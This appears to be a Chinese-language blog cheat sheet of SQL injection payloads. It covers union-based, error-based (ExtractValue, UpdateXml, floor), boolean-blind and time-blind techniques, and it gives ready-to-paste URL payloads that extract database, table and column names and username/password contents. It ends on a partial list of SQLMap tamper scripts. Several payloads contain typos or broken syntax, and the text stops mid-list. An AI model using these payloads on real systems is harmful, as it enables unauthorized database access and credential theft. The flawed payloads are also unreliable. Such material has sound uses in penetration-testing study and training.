01
 Payload收集


以下payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。


我们把注入场景分为：

a. 联合查询注入

b. 报错型注入

c. 布尔盲注

d. 时间盲注


a. 联合查询注入


使用场景

页面上有显示位

什么是显示位：在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位 。


Payload


判断当前数据表中有几列：

1?id=1' order by 数值 --+


查看显示位在第几列（假设一共三列）：

1?id=-1' union select 1,2,3 --+

注意：这里必须是查询一个不存在的记录才能起作用。


显示当前数据库（假设显示位中包含第三位）：

1?id=-1' union select 1,2,database() --+


查看当前数据库中的所有表：

1?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+

函数group_concat()把所有结果都在一行输出


查询所有数据库：

1?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+


查询某个数据库中的表：

1?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security' --+


查询某个表中的所有字段：

1?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+


查询某个表中的字段内容

1?id=-1' union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)

b. 报错型注入


使用场景

页面上没有显示位但是有sql语句执行错误信息输出。


Payload

主要有三种SQL注入报错方式：

ExtractValue

UpdateXml

floor


1）ExtractValue

首先来看ExtractValue()函数，它接受两个字符串参数，第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。例如：

1mysql> select ExtractValue('<a><b><b/></a>', '~');
2ERROR 1105 (HY000): XPATH syntax error: '~'


利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。

1mysql> select ExtractValue('<a><b><b/></a>', concat('~', (select database())));
2ERROR 1105 (HY000): XPATH syntax error: '~security'


2）UpdateXml

1UpdateXML(xml_target, xpath_expr, new_xml)


xml_target:：需要操作的xml片段

xpath_expr：需要更新的xml路径(Xpath格式)

new_xml：更新后的内容


不过这些参数都不太重要，这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：

1mysql> select updatexml('test', concat('~', (select database())), 'test');
2ERROR 1105 (HY000): XPATH syntax error: '~security'
3
4mysql> select updatexml('test', concat('~', (select version())), 'test');
5ERROR 1105 (HY000): XPATH syntax error: '~5.7.27-0ubuntu0.18.0.1'


3）Floor

有关floor()函数的注入原理可以看这篇文章。

固定格式：

1?id=-1' union select 1, count(*), concat((******), floor(rand()*2))as a from information_schema.tables group by a --+


******替换为查询语句即可。

查询数据库

1?id=-1' union select 1, count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+


查询某个数据库中的表

1?id=-1' union select 1,count(*), concat((select table_name from information_schema.tables where table_schema='security' limit 1, 1), floor(rand()*2)) as a from information_schema.columns group by a --+


查询表中的字段

1?id=-1' union select 1, count(*), concat((select column_name from information_schema.columns where table_schema='security' and table_name='users', limit 1,1), floor(rand()*2)) as a from information_schema.columns group by a --+


查询表中的字段内容

1?id=-1' union select 1,count(*), concat((select concat_ws('|',username,password) from security.users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+

修改limit x,1 可以显示第x个用户的password和username。


c. 布尔盲注


使用场景

页面没有显示位，也没有SQL语句执行错误信息，只能通过页面返回是否正常来判断注入点。


Payload

有用到二分法的思想


数据库名相关

查询数据库个数

1?id=1' union (select count(schema_name) from information_schema.schemata) < 77 --+


查询某一个数据库名的长度

1?id=1' union (select length(schema_name) from information_schema.schemata limit 1,1) < 77 --+


查询某个数据库名

1?id=1' union (select assii(substr(select schema_name from information_schema.schema limit 1,1)1,1)) < 77 --+


数据表相关

查询表的个数

1?id=1' union (select count(table_name) from information_schema.tables where table_schema='security') < 77 --+


查询表的长度

1?id=1' union (select length(table_name) from information.schema.tables where table_schema='security') < 77 --+


查看某个表名

1?id=1' union (select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))) < 77 --+


字段相关

查看某个表中的字段个数

1?id=1' union (select count(column_name) from information_schema.columns where table_schema='security' and table_name='users') < 77 --+


查看某个字段名的长度

1?id=1' union (select length(column_name) from infomation_schema.columns where table_schema='security' and table_name='users' limit 1,1) < 77 --+


查看某个字段名

1?id=1' union (select ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),1,1))) < 77 --+


记录内容相关

查看表中行数

1?id=1' union (select count(*) from security.users) < 77 --+


查看某个字段内容的长度

1?id=1' union (select length(username) from security.users limit 1,1) < 77 --+


查看某个字段的内容

1?id=1' union (select ascii(substr((select username from security.users limit 1,1),1,1))) < 77 --+


d. 时间盲注


使用场景

页面上没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，如果if条件成立则页面的返回速度明显慢了5秒。


Payload

与布尔盲注的思想类似

判断数据库的个数

1id=1' and if((select count(schema_name) from information_schema.schemata)=9, sleep(5), 1) --+


判断数据库名的长度

1id=1' and if((select length(schema_name) from information_schema.schemata)=9, sleep(5), 1) --+


查询数据库名

1id=1' and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1)1,1)))=105, sleep(5), 1) --+

SQLMap的tamper使用命令如下：

1sql -u [url] --tamper  [模块名]

常用的tamper脚本


1)apostrophemask.py

适用数据库：ALL

作用：将引号替换为utf-8，用于过滤单引号

使用脚本前：tamper(“1 AND ‘1’='1”)

使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871


2)base64encode.py

适用数据库：ALL
